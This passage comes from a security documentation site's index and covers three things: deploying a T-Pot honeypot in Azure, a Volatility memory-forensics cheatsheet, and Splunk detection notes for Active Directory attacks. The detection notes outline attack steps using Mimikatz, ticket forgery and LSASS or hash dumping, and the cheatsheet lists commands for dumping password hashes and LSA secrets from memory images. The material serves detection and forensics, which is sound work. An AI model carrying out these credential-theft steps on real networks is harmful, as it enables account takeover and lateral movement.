Group (NSG)\naz network nsg create --resource-group rg-tpot --name nsg-tpot\n</code></pre> <p>Now we will be setting up NSG rules that only allow our public IP address (can be IP address of our home computer, or the subnet used by our campus) to access the admin ports of T-Pot. You can get your own IP address by going to https://whatismyipaddress.com. Replace <code>[ip-address]</code> with your own IP address. <pre><code># add a rule to an existing NSG\naz network nsg rule create --resource-group rg-tpot --name AdminAccess1-tpot --nsg-name nsg-tpot --direction Inbound --priority 200 --source-address-prefixes [ip-address] --destination-port-ranges 64294-64297 --access Allow\n\n# create a deny rule in NSG that blocks inbound traffic to specific ports\naz network nsg rule create --resource-group rg-tpot --name BlockAdminPorts-tpot --nsg-name nsg-tpot --direction Inbound --priority 300 --destination-port-ranges 64294-64297 --access Deny\n\n# create a rule in NSG that allows all inbound traffic on all ports as a \"catch-all\" rule\naz network nsg rule create --resource-group rg-tpot --name AllowAllElse-tpot --nsg-name nsg-tpot --direction Inbound --priority 400 --destination-port-ranges 0-65535 --access Allow\n</code></pre></p> <p>Now we can create a virtual machine named \"vm-tpot\" using the command below: <pre><code># deploy a new VM\naz vm create --name vm-tpot --resource-group rg-tpot --image Canonical:ubuntu-24_04-lts:server:latest --admin-username [your-username] --admin-password \"[your-password]\" --vnet-name vnet-tpot --subnet subnet-tpot --size Standard_B4ms --public-ip-address-allocation static --nsg nsg-tpot --no-wait\n</code></pre></p>"},{"location":"blog/2025/02/02/deploy-t-pot-in-azure-cloud-for-free/#configure-the-virtual-machine","title":"Configure the Virtual Machine","text":"<p> Use the search bar to search for <code>Virtual machines</code> page. The virtual machine will be in \"creating\" status initially, and you will need to refresh until you see the status is \"running\".   After the virtual machine is created and running, stop it and wait for it to halt.   In the Azure GUI for the VM, open <code>Settings</code> -&gt; <code>Disks</code>. Click on your OS Disk.   Then, in <code>Size + Performance</code>, select 128GB, and then <code>Save</code>. You can refer to T-Pot system requirement here. Considering we are using $100 credit, 128GB storage should be sufficient for us to collect at least a week of logs. Make sure to occasionally check your machine to see if you have free storage space, as filling up the storage will crash the system.</p>"},{"location":"blog/2025/02/02/deploy-t-pot-in-azure-cloud-for-free/#install-t-pot-in-the-virtual-machine","title":"Install T-Pot in the Virtual Machine","text":"<p> With our Ubuntu Server virtual machine up and running, we can now connect to it via SSH to install and run T-Pot.</p> <p>Connect to the virtual machine using the following command: <pre><code>ssh [username]@[vm-public-ip-address]\n</code></pre></p> <p>After connecting to the virtual machine, start by updating the packaging lists with: <pre><code>sudo apt update\n</code></pre></p> <p>Next, install T-Pot by following the official instructions here, or you can refer to the command below: <pre><code>git clone https://github.com/telekom-security/tpotce\ncd tpotce\n./install.sh\n\n# when prompted, choose \"h\" for T-Pot Hive/Standard\n\n# once done, reboot your machine\nsudo reboot\n</code></pre></p> <p>Danger</p> <p>Note that once T-Pot is installed, our SSH is now using port 64295, as the default SSH port (port 22) is now a honeypot.  </p> <p>If you would like to connect to your virtual machine again, you can use the command below: <pre><code>ssh [username]@[vm-public-ip-address] -p 64295\n</code></pre></p> <p> Once the installation is complete, we can access T-Pot web interface at <code>https://[vm-public-ip-address]:64297</code>.</p>"},{"location":"blog/2025/02/02/deploy-t-pot-in-azure-cloud-for-free/#tips","title":"Tips","text":""},{"location":"blog/2025/02/02/deploy-t-pot-in-azure-cloud-for-free/#only-run-selected-honeypots","title":"Only Run Selected Honeypots","text":"<p> If you want to run only specific honeypots, you can modify the <code>docker-compose.yml</code> file. The full location of the file is <code>./tpotce/docker-compose.yml</code>. To disable a honeypot, you can comment out its section in the file by adding a <code>#</code> at the beginning of the line. You can refer to this T-Pot GitHub issue for further discussion on customizing the selection of honeypots.</p>"},{"location":"blog/2025/02/02/deploy-t-pot-in-azure-cloud-for-free/#change-of-ip-address-for-accessing-admin-page","title":"Change of IP Address for Accessing Admin Page","text":"<p> If your IP address changes and you can no longer access the T-Pot admin GUI, you need to update the allowed IP address in Azure NSG settings. Follow the steps above to modify the rule by changing the IP address.</p>"},{"location":"cheatsheets/dfir/volatility/","title":"\ud83d\udd0d Volatility 2 & 3 Cheatsheet","text":"<p>This is a cheatsheet mainly for analyzing Windows memory using Volatility 2 and Volatility 3.</p> List of All Plugins Available Volatility 2Volatility 3 <pre><code>atoms           Print session and window station atom tables\natomscan        Pool scanner for atom tables\nbigpools        Dump the big page pools using BigPagePoolScanner\nbioskbd         Reads the keyboard buffer from Real Mode memory\ncallbacks       Print system-wide notification routines\nclipboard       Extract the contents of the windows clipboard\ncmdline         Display process command-line arguments\ncmdscan         Extract command history by scanning for _COMMAND_HISTORY\nconnections     Print list of open connections [Windows XP and 2003 Only]\nconnscan        Pool scanner for tcp connections\nconsoles        Extract command history by scanning for _CONSOLE_INFORMATION\ncrashinfo       Dump crash-dump information\ndeskscan        Poolscaner for tagDESKTOP (desktops)\ndevicetree      Show device tree\ndlldump         Dump DLLs from a process address space\ndlllist         Print list of loaded dlls for each process\ndriverirp       Driver IRP hook detection\ndrivermodule    Associate driver objects to kernel modules\ndriverscan      Pool scanner for driver objects\ndumpcerts       Dump RSA private and public SSL keys\ndumpfiles       Extract memory mapped and cached files\neditbox         Displays information about Edit controls. (Listbox experimental.)\neventhooks      Print details on windows event hooks\nfilescan        Pool scanner for file objects\ngahti           Dump the USER handle type information\ngditimers       Print installed GDI timers and callbacks\ngdt             Display Global Descriptor Table\nhandles         Print list of open handles for each process\nhibinfo         Dump hibernation file information\nhivedump        Prints out a hive\nhivelist        Print list of registry hives.\nhivescan        Pool scanner for registry hives\nhpakextract     Extract physical memory from an HPAK file\nhpakinfo        Info on an HPAK file\nidt             Display Interrupt Descriptor Table\niehistory       Reconstruct Internet Explorer cache / history\nimagecopy       Copies a physical address space out as a raw DD image\nimageinfo       Identify information for the image\nimpscan         Scan for calls to imported functions\njoblinks        Print process job link information\nkdbgscan        Search for and dump potential KDBG values\nkpcrscan        Search for and dump potential KPCR values\nldrmodules      Detect unlinked DLLs\nmachoinfo       Dump Mach-O file format information\nmalfind         Find hidden and injected code\nmbrparser       Scans for and parses potential Master Boot Records (MBRs)\nmemdump         Dump the addressable memory for a process\nmemmap          Print the memory map\nmessagehooks    List desktop and thread window message hooks\nmftparser       Scans for and parses potential MFT entries\nmoddump         Dump a kernel driver to an executable file sample\nmodscan         Pool scanner for kernel modules\nmodules         Print list of loaded modules\nmultiscan       Scan for various objects at once\nmutantscan      Pool scanner for mutex objects\nnotepad         List currently displayed notepad text\nobjtypescan     Scan for Windows object type objects\npatcher         Patches memory based on page scans\npoolpeek        Configurable pool scanner plugin\nprintkey        Print a registry key, and its subkeys and values\nprivs           Display process privileges\nprocdump        Dump a process to an executable file sample\npslist          Print all running processes by following the EPROCESS lists\npsscan          Pool scanner for process objects\npstree          Print process list as a tree\npsxview         Find hidden processes with various process listings\nqemuinfo        Dump Qemu information\nraw2dmp         Converts a physical memory sample to a windbg crash dump\nscreenshot      Save a pseudo-screenshot based on GDI windows\nsessions        List details on _MM_SESSION_SPACE (user logon sessions)\nsockets         Print list of open sockets\nsockscan        Pool scanner for tcp socket objects\nstrings         Match physical offsets to virtual addresses (may take a while, VERY verbose)\nsymlinkscan     Pool scanner for symlink objects\nthrdscan        Pool scanner for thread objects\ntimers          Print kernel timers and associated module DPCs\nunloadedmodules Print list of unloaded modules\nuserhandles     Dump the USER handle tables\nvaddump         Dumps out the vad sections to a file\nvadinfo         Dump the VAD info\nvadtree         Walk the VAD tree and display in tree format\nvadwalk         Walk the VAD tree\nvboxinfo        Dump virtualbox information\nverinfo         Prints out the version information from PE images\nvmwareinfo      Dump VMware VMSS/VMSN information\nvolshell        Shell in the memory image\nwindows         Print Desktop Windows (verbose details)\nwintree         Print Z-Order Desktop Windows Tree\nwndscan         Pool scanner for window stations\nyarascan        Scan process or kernel memory with Yara signatures\n</code></pre> <pre><code>timeliner.Timeliner\n                    Runs all relevant plugins that provide time related information and orders the results by time.\nwindows.bigpools.BigPools\n                    List big page pools.\nwindows.cachedump.Cachedump\n                    Dumps lsa secrets from memory\nwindows.callbacks.Callbacks\n                    Lists kernel callbacks and notification routines.\nwindows.cmdline.CmdLine\n                    Lists process command line arguments.\nwindows.crashinfo.Crashinfo\n                    Lists the information from a Windows crash dump.\nwindows.devicetree.DeviceTree\n                    Listing tree based on drivers and attached devices in a particular windows memory image.\nwindows.dlllist.DllList\n                    Lists the loaded modules in a particular windows memory image.\nwindows.driverirp.DriverIrp\n                    List IRPs for drivers in a particular windows memory image.\nwindows.drivermodule.DriverModule\n                    Determines if any loaded drivers were hidden by a rootkit\nwindows.driverscan.DriverScan\n                    Scans for drivers present in a particular windows memory image.\nwindows.dumpfiles.DumpFiles\n                    Dumps cached file contents from Windows memory samples.\nwindows.envars.Envars\n                    Display process environment variables\nwindows.filescan.FileScan\n                    Scans for file objects present in a particular windows memory image.\nwindows.getservicesids.GetServiceSIDs\n                    Lists process token sids.\nwindows.getsids.GetSIDs\n                    Print the SIDs owning each process\nwindows.handles.Handles\n                    Lists process open handles.\nwindows.hashdump.Hashdump\n                    Dumps user hashes from memory\nwindows.info.Info   Show OS &amp; kernel details of the memory sample being analyzed.\nwindows.joblinks.JobLinks\n                    Print process job link information\nwindows.ldrmodules.LdrModules\n                    Lists the loaded modules in a particular windows memory image.\nwindows.lsadump.Lsadump\n                    Dumps lsa secrets from memory\nwindows.malfind.Malfind\n                    Lists process memory ranges that potentially contain injected code.\nwindows.mbrscan.MBRScan\n                    Scans for and parses potential Master Boot Records (MBRs)\nwindows.memmap.Memmap\n                    Prints the memory map\nwindows.modscan.ModScan\n                    Scans for modules present in a particular windows memory image.\nwindows.modules.Modules\n                    Lists the loaded kernel modules.\nwindows.mutantscan.MutantScan\n                    Scans for mutexes present in a particular windows memory image.\nwindows.netscan.NetScan\n                    Scans for network objects present in a particular windows memory image.\nwindows.netstat.NetStat\n                    Traverses network tracking structures present in a particular windows memory image.\nwindows.poolscanner.PoolScanner\n                    A generic pool scanner plugin.\nwindows.privileges.Privs\n                    Lists process token privileges\nwindows.pslist.PsList\n                    Lists the processes present in a particular windows memory image.\nwindows.psscan.PsScan\n                    Scans for processes present in a particular windows memory image.\nwindows.pstree.PsTree\n                    Plugin for listing processes in a tree based on their parent process ID.\nwindows.registry.certificates.Certificates\n                    Lists the certificates in the registry's Certificate Store.\nwindows.registry.hivelist.HiveList\n                    Lists the registry hives present in a particular memory image.\nwindows.registry.hivescan.HiveScan\n                    Scans for registry hives present in a particular windows memory image.\nwindows.registry.printkey.PrintKey\n                    Lists the registry keys under a hive or specific key value.\nwindows.registry.userassist.UserAssist\n                    Print userassist registry keys and information.\nwindows.sessions.Sessions\n                    lists Processes with Session information extracted from Environmental Variables\nwindows.skeleton_key_check.Skeleton_Key_Check\n                    Looks for signs of Skeleton Key malware\nwindows.ssdt.SSDT   Lists the system call table.\nwindows.statistics.Statistics\n                    Lists statistics about the memory space.\nwindows.strings.Strings\n                    Reads output from the strings command and indicates which process(es) each string belongs to.\nwindows.symlinkscan.SymlinkScan\n                    Scans for links present in a particular windows memory image.\nwindows.vadinfo.VadInfo\n                    Lists process memory ranges.\nwindows.vadwalk.VadWalk\n                    Walk the VAD tree.\nwindows.verinfo.VerInfo\n                    Lists version information from PE files.\nwindows.virtmap.VirtMap\n                    Lists virtual mapped sections.\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#system-information","title":"System Information","text":""},{"location":"cheatsheets/dfir/volatility/#identify-image-information-profile","title":"Identify image information / profile","text":"Volatility 2Volatility 3 <pre><code>vol.py -f /path/to/image imageinfo\n</code></pre> <pre><code>vol.py -f /path/to/image windows.info\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#process-information","title":"Process Information","text":""},{"location":"cheatsheets/dfir/volatility/#list-running-processes","title":"List running processes","text":"Volatility 2Volatility 3 <pre><code>vol.py -f /path/to/image --profile=&lt;profile&gt; pstree\nvol.py -f /path/to/image --profile=&lt;profile&gt; pslist\nvol.py -f /path/to/image --profile=&lt;profile&gt; psscan\n</code></pre> <pre><code>vol.py -f /path/to/image windows.pstree\nvol.py -f /path/to/image windows.pslist\nvol.py -f /path/to/image windows.psscan\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#identify-file-handles","title":"Identify file handles","text":"<p>This reveals the resources and objects a process is interacting with.</p> Volatility 2Volatility 3 <pre><code>vol.py -f /path/to/image --profile=&lt;profile&gt; handles -p &lt;pid&gt; --object-type=Key\nvol.py -f /path/to/image --profile=&lt;profile&gt; handles -p &lt;pid&gt; --object-type=File\nvol.py -f /path/to/image --profile=&lt;profile&gt; handles -p &lt;pid&gt; --object-type=Process\n</code></pre> <pre><code>vol.py -f /path/to/image windows.handles --pid &lt;pid&gt;\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#identify-loaded-dlls","title":"Identify loaded DLLs","text":"Volatility 2Volatility 3 <pre><code>vol.py -f /path/to/image --profile=&lt;profile&gt; dlllist -p &lt;pid&gt;\n</code></pre> <pre><code>vol.py -f /path/to/image windows.dlllist --pid &lt;pid&gt;\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#network-information","title":"Network Information","text":""},{"location":"cheatsheets/dfir/volatility/#identify-network-artifacts","title":"Identify network artifacts","text":"Volatility 2Volatility 3 <pre><code>vol.py -f /path/to/image --profile=&lt;profile&gt; netstat\nvol.py -f /path/to/image --profile=&lt;profile&gt; netscan\n</code></pre> <pre><code>vol.py -f /path/to/image windows.netstat\nvol.py -f /path/to/image windows.netscan\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#file-information","title":"File Information","text":""},{"location":"cheatsheets/dfir/volatility/#list-files","title":"List files","text":"Volatility 2Volatility 3 <pre><code>vol.py -f /path/to/image --profile=&lt;profile&gt; filescan\n</code></pre> <pre><code>vol.py -f /path/to/image windows.filescan\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#extract-files","title":"Extract files","text":"Volatility 2Volatility 3 <pre><code>vol.py -f /path/to/image --profile=&lt;profile&gt; dumpfiles \u2011\u2011dump-dir=\"/path/to/output/dir\"\nvol.py -f /path/to/image --profile=&lt;profile&gt; dumpfiles \u2011\u2011dump-dir=\"/path/to/output/dir\" -Q &lt;offset&gt;\nvol.py -f /path/to/image --profile=&lt;profile&gt; dumpfiles \u2011\u2011dump-dir=\"/path/to/output/dir\" -p &lt;pid&gt;\n</code></pre> <pre><code>vol.py -f /path/to/image -o /path/to/output/dir windows.dumpfiles\nvol.py -f /path/to/image -o /path/to/output/dir windows.dumpfiles \u2011\u2011virtaddr &lt;offset&gt;\nvol.py -f /path/to/image -o /path/to/output/dir windows.dumpfiles \u2011\u2011physaddr &lt;offset&gt;\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#registry-information","title":"Registry Information","text":""},{"location":"cheatsheets/dfir/volatility/#list-registry-hives","title":"List registry hives","text":"Volatility 2Volatility 3 <pre><code>vol.py -f /path/to/image --profile=&lt;profile&gt; hivescan\nvol.py -f /path/to/image --profile=&lt;profile&gt; hivelist\n</code></pre> <pre><code>vol.py -f /path/to/image windows.hivescan\nvol.py -f /path/to/image windows.hivelist\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#list-registry-key-values","title":"List registry key values","text":"Volatility 2Volatility 3 <pre><code>vol.py -f /path/to/image --profile=&lt;profile&gt; printkey\nvol.py -f /path/to/image --profile=&lt;profile&gt; printkey -K \"&lt;key-path&gt;\"\n                                                           # e.g. Software\\Microsoft\\Windows\\CurrentVersion\n</code></pre> <pre><code>vol.py -f /path/to/image windows.registry.printkey\nvol.py -f /path/to/image windows.registry.printkey --key \"&lt;key-path&gt;\"\n                                                           # e.g. Software\\Microsoft\\Windows\\CurrentVersion\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#user-activity","title":"User Activity","text":""},{"location":"cheatsheets/dfir/volatility/#list-executed-commands","title":"List executed commands","text":"Volatility 2Volatility 3 <pre><code>vol.py -f /path/to/image --profile=&lt;profile&gt; cmdline\nvol.py -f /path/to/image --profile=&lt;profile&gt; cmdscan\nvol.py -f /path/to/image --profile=&lt;profile&gt; consoles\n</code></pre> <pre><code>vol.py -f /path/to/image windows.cmdline\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#list-clipboard-contents","title":"List clipboard contents","text":"Volatility 2Volatility 3 <pre><code>vol.py -f /path/to/image --profile=&lt;profile&gt; clipboard\n</code></pre> <pre><code>N/A\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#miscellaneous","title":"Miscellaneous","text":""},{"location":"cheatsheets/dfir/volatility/#identify-injected-code","title":"Identify injected code","text":"Volatility 2Volatility 3 <pre><code>vol.py -f /path/to/image --profile=&lt;profile&gt; malfind\n</code></pre> <pre><code>vol.py -f /path/to/image windows.malfind\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#list-environment-variables","title":"List environment variables","text":"Volatility 2Volatility 3 <pre><code>vol.py -f /path/to/image --profile=&lt;profile&gt; envars\n</code></pre> <pre><code>vol.py -f /path/to/image windows.envars\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#dump-password-hashes","title":"Dump password hashes","text":"Volatility 2Volatility 3 <pre><code>vol.py -f /path/to/image --profile=&lt;profile&gt; hashdump\n</code></pre> <pre><code>vol.py -f /path/to/image windows.hashdump\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#dump-lsa-secrets","title":"Dump LSA secrets","text":"Volatility 2Volatility 3 <pre><code>vol.py -f /path/to/image --profile=&lt;profile&gt; lsadump\n</code></pre> <pre><code>vol.py -f /path/to/image windows.lsadump\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#strings","title":"Strings","text":""},{"location":"cheatsheets/dfir/volatility/#find-ipv4-addresses","title":"Find IPv4 addresses","text":"<pre><code>strings /path/to/image | grep -E \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\"\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#find-email-addresses","title":"Find email addresses","text":"<pre><code>strings /path/to/image | grep -oE \"\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,4}\\b\"\n</code></pre>"},{"location":"cheatsheets/dfir/volatility/#find-cmd-or-powershell-artifacts","title":"Find CMD or PowerShell artifacts","text":"<pre><code>strings /path/to/image | grep -E \"(cmd|powershell|bash)[^\\s]+\"\n</code></pre>"},{"location":"cheatsheets/dfir/detect-ad-attacks/dcsync-dcshadow/","title":"Detecting DCSync and DCShadow","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/dcsync-dcshadow/#dcsync","title":"DCSync","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/dcsync-dcshadow/#attack-steps","title":"Attack Steps","text":"<ol> <li>Attacker secures admin access to a domain-joined system or escalates priv to get the requisite rights to request replication data</li> <li>Use Mimikatz to request domain replication data using <code>DRSGetNCChanges</code> interfaces to act as a legit domain controller</li> <li>Attacker may then craft Golden Tickets, Silver Tickets, or opt to employ Pass-the-Hash/Overpass-the-Hash attacks</li> </ol> <p>Note</p> <p>Legitimate DCSync should only be performed by <code>machine accounts</code> or <code>SYSTEM</code>, not users.</p>"},{"location":"cheatsheets/dfir/detect-ad-attacks/dcsync-dcshadow/#detection","title":"Detection","text":"<ul> <li><code>DS-Replication-Get-Changes</code>\u00a0operations can be recorded with\u00a0<code>Event ID 4662</code>. However, an additional\u00a0<code>Audit Policy Configuration</code>\u00a0is needed since it is not enabled by default (Computer Configuration/Windows Settings/Security Settings/Advanced Audit Policy Configuration/DS Access).<ul> <li>Seek out events containing the property\u00a0<code>{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}</code>, corresponding to\u00a0<code>DS-Replication-Get-Changes</code>, as Event\u00a0<code>4662</code>\u00a0solely consists of GUIDs.</li> </ul> </li> </ul> <pre><code>index=\"main\" EventCode=4662 Access_Mask=0x100 Account_Name!=*$ Message=*{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}*\n</code></pre> <pre><code>index=main EventCode=4662 Message=\"*Replicating Directory Changes*\"\n| rex field=Message \"(?P&lt;property&gt;Replicating Directory Changes.*)\"\n| table _time, user, object_file_name, Object_Server, property\n</code></pre>"},{"location":"cheatsheets/dfir/detect-ad-attacks/dcsync-dcshadow/#dcshadow","title":"DCShadow","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/dcsync-dcshadow/#attack-steps_1","title":"Attack Steps","text":"<ol> <li>The attacker secures administrative access to a domain-joined system or escalates privileges to acquire the necessary rights to request replication data.</li> <li>The attacker registers a rogue domain controller within the domain, leveraging the\u00a0<code>Directory Replicator</code>\u00a0permission, and executes changes to AD objects, such as modifying user groups to Domain Administrator groups.</li> <li>The rogue domain controller initiates replication with the legitimate domain controllers, disseminating the changes throughout the domain.</li> </ol>"},{"location":"cheatsheets/dfir/detect-ad-attacks/dcsync-dcshadow/#detection_1","title":"Detection","text":"<p>To emulate a Domain Controller, DCShadow must implement specific modifications in Active Directory:</p> <ul> <li><code>Add a new nTDSDSA object</code></li> <li><code>Append a global catalog ServicePrincipalName to the computer object</code></li> <li>Detection \u2192 Event ID 4742 - <code>ServicePrincipalName</code></li> </ul> <pre><code>index=main EventCode=4742 \n| rex field=Message \"(?P&lt;gcspn&gt;GC\\/[a-zA-Z0-9\\.\\-\\/]+)\" \n| table _time, ComputerName, Security_ID, Account_Name, user, gcspn \n| search gcspn=*\n</code></pre>"},{"location":"cheatsheets/dfir/detect-ad-attacks/delegation/","title":"Detecting Unconstrained Delegation/Constrained Delegation Attacks","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/delegation/#unconstraned-delegation","title":"Unconstraned Delegation","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/delegation/#attack-steps","title":"Attack Steps","text":"<ol> <li>Attacker identifies system with Unconstrained Delegation enabled</li> <li>Attacker gain access to the system</li> <li>Attacker extracts TCT from memory using Mimikatz</li> </ol>"},{"location":"cheatsheets/dfir/detect-ad-attacks/delegation/#detection","title":"Detection","text":"<ul> <li>Event ID 4104 - PowerShell script block logging</li> <li>LDAP request logging</li> <li>The main goal of an Unconstrained Delegation attack is to retrieve and reuse TGT tickets, so Pass-the-Ticket detection can be used as well</li> </ul> <pre><code>index=main source=\"WinEventLog:Microsoft-Windows-PowerShell/Operational\" EventCode=4104 Message=\"*TrustedForDelegation*\" OR Message=\"*userAccountControl:1.2.840.113556.1.4.803:=524288*\" \n| table _time, ComputerName, EventCode, Message\n</code></pre>"},{"location":"cheatsheets/dfir/detect-ad-attacks/delegation/#contrained-delegation","title":"Contrained Delegation","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/delegation/#attack-steps_1","title":"Attack Steps","text":"<ol> <li>Attacker identifies systems with Constrained Delegation enabled and determine which resources they are allowed to delegate</li> <li>Attacker gains access to the TGT of the principal (user/computer)<ol> <li>can be extracted from memory (Rubeus dump)</li> <li>can also be requested with the principal\u2019s hash</li> </ol> </li> <li>Attacker uses S4U technique to impersonate a high-privileged account to the targeted service (requesting a TGS ticket)</li> <li>Attacker injects the requested ticket and accesses targeted services as the impersonated user</li> </ol>"},{"location":"cheatsheets/dfir/detect-ad-attacks/delegation/#detection_1","title":"Detection","text":"<ul> <li>Event ID 4104 - PowerShell script block logging</li> <li>LDAP request logging</li> <li>Unusual process network connection to TCP/UDP port\u00a0<code>88</code>\u00a0(Kerberos)</li> </ul> <pre><code>index=main source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" \n| eventstats values(process) as process by process_id\n| where EventCode=3 AND dest_port=88\n| table _time, Computer, dest_ip, dest_port, Image, process\n</code></pre>"},{"location":"cheatsheets/dfir/detect-ad-attacks/golden-silver-ticket/","title":"Detecting Golden Tickets and Silver Tickets","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/golden-silver-ticket/#golden-ticket","title":"Golden Ticket","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/golden-silver-ticket/#attack-steps","title":"Attack Steps","text":"<ol> <li>Attacker extract NTLM hash of KRBTGT account using DCSync attack<ol> <li>or can use NTDS.dit and LSASS process dumps on Domain Controller</li> </ol> </li> <li>Forge a fake user acc with KRBTGT hash and assign it to Domain Admin</li> <li>The attacker injects the forged TGT in the same manner as a Pass-the-Ticket attack</li> </ol>"},{"location":"cheatsheets/dfir/detect-ad-attacks/golden-silver-ticket/#detection","title":"Detection","text":"<p>Detecting Golden Ticket attacks can be challenging, as the TGT can be forged offline by an attacker, leaving virtually no traces of\u00a0<code>Mimikatz</code>\u00a0execution. One option is to monitor common methods of extracting the\u00a0<code>KRBTGT</code>\u00a0hash:</p> <ul> <li><code>DCSync attack</code></li> <li><code>NTDS.dit file access</code></li> <li><code>LSASS memory read on the domain controller (Sysmon Event ID 10)</code></li> </ul> <p>From another standpoint, a Golden Ticket is just another ticket for Pass-the-Ticket detection.</p> <pre><code>index=main source=\"WinEventLog:Security\" user!=*$ EventCode IN (4768,4769,4770) \n| rex field=user \"(?&lt;username&gt;[^@]+)\"\n| rex field=src_ip \"(\\:\\:ffff\\:)?(?&lt;src_ip_4&gt;[0-9\\.]+)\"\n| transaction username, src_ip_4 maxspan=10h keepevicted=true startswith=(EventCode=4768)\n| where closed_txn=0\n| search NOT user=\"*$@*\"\n| table _time, ComputerName, username, src_ip_4, service_name, category\n</code></pre>"},{"location":"cheatsheets/dfir/detect-ad-attacks/golden-silver-ticket/#silver-ticket","title":"Silver Ticket","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/golden-silver-ticket/#attack-steps_1","title":"Attack Steps","text":"<ol> <li>The attacker extracts the NTLM hash of the targeted service account (or the computer account for\u00a0<code>CIFS</code>\u00a0access) using tools like\u00a0<code>Mimikatz</code>\u00a0or other credential dumping techniques.</li> <li>Generate a Silver Ticket: Using the extracted NTLM hash, the attacker employs tools like\u00a0<code>Mimikatz</code>\u00a0to create a forged TGS ticket for the specified service.</li> <li>The attacker injects the forged TGT in the same manner as a Pass-the-Ticket attack.</li> </ol>"},{"location":"cheatsheets/dfir/detect-ad-attacks/golden-silver-ticket/#detecting-silter-tickets-through-user-correlation","title":"Detecting Silter Tickets Through User Correlation","text":"<ul> <li>Event ID 4720 - Identify newly created users (cuz attacker created fake user acc)<ul> <li>Then can compare the list with logged-in users</li> </ul> </li> </ul> <p>Create a list of users with Event ID 4720 <pre><code>index=main latest=1690448444 EventCode=4720\n| stats min(_time) as _time, values(EventCode) as EventCode by user\n| outputlookup users.csv\n</code></pre></p> <p>Compare list above with logged-in users <pre><code>index=main latest=1690545656 EventCode=4624\n| stats min(_time) as firstTime, values(ComputerName) as ComputerName, values(EventCode) as EventCode by user\n| eval last24h = 1690451977\n| where firstTime &gt; last24h\n```| eval last24h=relative_time(now(),\"-24h@h\")```\n| convert ctime(firstTime)\n| convert ctime(last24h)\n| lookup users.csv user as user OUTPUT EventCode as Events\n| where isnull(Events)\n</code></pre></p>"},{"location":"cheatsheets/dfir/detect-ad-attacks/golden-silver-ticket/#detecting-silter-tickets-by-targeting-special-privileges-assigned-to-new-logon","title":"Detecting Silter Tickets by Targeting Special Privileges Assigned To New Logon","text":"<ul> <li>Event ID 4672 - Detect anomalously assigned privileges</li> </ul> <pre><code>index=main latest=1690545656 EventCode=4672\n| stats min(_time) as firstTime, values(ComputerName) as ComputerName by Account_Name\n| eval last24h = 1690451977 \n```| eval last24h=relative_time(now(),\"-24h@h\") ```\n| where firstTime &gt; last24h \n| table firstTime, ComputerName, Account_Name \n| convert ctime(firstTime)\n</code></pre>"},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-spray/","title":"Detecting Password Spraying","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-spray/#password-spraying-windows-event-id","title":"Password Spraying Windows Event ID","text":"<p>Password spraying activity will create multiple failed logon attempts from different user accounts from the same source IP address within a short period of time. Therefore, we can search for <code>Event ID 4625 - Failed Logon</code> for potential password spraying attempts.</p>"},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-spray/#splunk-query","title":"Splunk Query","text":"<pre><code>index=main source=\"WinEventLog:Security\" EventCode=4625\n| bin span=15m _time\n| stats values(user) as Users, dc(user) as dc_user by src, Source_Network_Address, dest, EventCode, Failure_Reason\n</code></pre>"},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-the-hash/","title":"Detecting Pass-the-Hash","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-the-hash/#attack-steps","title":"Attack Steps","text":"<ol> <li>Use Mimikatz to extract NTLM hash of currently logged user on the compromised system (local admin priv required)</li> <li>Use Mimikatz with the hash and authenticate as the targeted user</li> <li>Move laterally within the network to gain access to systems and resources</li> </ol>"},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-the-hash/#detection-look-for-event-id-4624-with-logon-type-9","title":"Detection - Look for Event ID 4624 with Logon Type 9","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-the-hash/#splunk-query","title":"Splunk Query","text":"<pre><code>index=main source=\"WinEventLog:Security\" EventCode=4624 Logon_Type=9 Logon_Process=seclogo\n| table _time, ComputerName, EventCode, user, Network_Account_Domain, Network_Account_Name, Logon_Type, Logon_Process\n</code></pre>"},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-the-hash/#detection-look-for-lsass-memory-access","title":"Detection - Look for LSASS memory access","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-the-hash/#splunk-query_1","title":"Splunk Query","text":"<pre><code>index=main (source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=10 TargetImage=\"C:\\\\Windows\\\\system32\\\\lsass.exe\" SourceImage!=\"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\platform\\\\*\\\\MsMpEng.exe\") OR (source=\"WinEventLog:Security\" EventCode=4624 Logon_Type=9 Logon_Process=seclogo)\n| sort _time, RecordNumber\n| transaction 